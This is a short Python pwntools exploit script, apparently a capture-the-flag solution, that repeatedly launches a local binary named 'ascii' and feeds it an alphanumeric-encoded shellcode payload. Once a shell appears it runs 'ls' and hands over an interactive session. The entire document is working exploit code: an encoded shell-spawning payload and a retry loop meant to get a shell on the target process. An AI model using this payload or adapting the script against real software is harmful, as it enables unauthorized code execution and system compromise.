from pwn import *

context.log_level = 'DEBUG'

while True:
    p = process('/home/ascii/ascii')
    payload = b'j0X40PZJCCCSTY01XP\\CCCCCCCCCCCCCCCCCCPYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01TxY+_UAAAAAAAAAAAAY+_UAAAAAAAAAAAAZ+_UAAAAAAA'
    p.sendline(payload)
    try:
        p.recvline()
        p.sendline('ls')
        p.recvline()
        p.interactive()
    except:
        pass
    p.close()